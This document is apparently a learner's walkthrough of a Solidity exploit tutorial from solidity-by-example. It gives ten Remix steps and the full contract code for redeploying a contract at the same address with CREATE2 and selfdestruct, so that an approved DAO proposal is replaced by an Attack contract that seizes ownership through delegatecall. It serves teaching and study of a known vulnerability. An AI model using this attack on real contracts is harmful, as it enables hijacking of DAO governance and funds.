=> Deploying multiple contracts at same address ?

Borrow code from
https://solidity-by-example.org/hacks/deploy-different-contracts-same-address/

Following are the contracts in the above link:

contract DA0
contract DeployerDeployer
contract Deployer
contract Proposal
contract Attack

For the sake of Hyper~Simplicity Assume contract DAO doesn't exist
so we will work with ~
DeployerDeployer, Deployer, Proposal, Attack

Copy these 4 contracts in single remix file

Step 1: deploy DeployerDeployer contract && execute deploy function
Step 2: In the Logs, Copy the address of the deployer contract
Step 3: Select Deploy contract in deploy tab dropdown, instead of deploying it via yellow
deploy button, Use the blue `At Address` button and paste the address of deploy contract
Now you can interact with **deploy** contract

Step 4: Now deploy the Proposal contract via deployProposal function in **deploy** contract
Step 5: Note down the Proposal contract address from logs
Step 6: Interact(via `At Address` button in remix deploy section) with Proposal contract and
execute the selfdestruct function which is emergencyStop() in this code context
Step 7: Execute the Kill function in **deploy** contract 
Step 8: go back to **DeployerDeployer** contract && deploy **deploy** contract via deploy()
Step 9: Notice the same address of **deployer** contract as it was before
Step 10: execute deployAttack() in **deployer** contract to deploye attack contract on the
same address as the porposal contract was earlier

Now why we went extra mile if the deployer contract got the same address as it had before:
because of the nonce thing 
Sounds Confusing?? Just Do these steps...

Here is the code from https://solidity-by-example.org/
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
Called by Alice
0. Deploy DAO

Called by Attacker
1. Deploy DeployerDeployer
2. Call DeployerDeployer.deploy()
3. Call Deployer.deployProposal()

Called by Alice
4. Get DAO approval of Proposal

Called by Attacker
5. Delete Proposal and Deployer
6. Re-deploy Deployer
7. Call Deployer.deployAttack()
8. Call DAO.execute
9. Check DAO.owner is attacker's address

DAO -- approved --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Attack
*/

contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
```
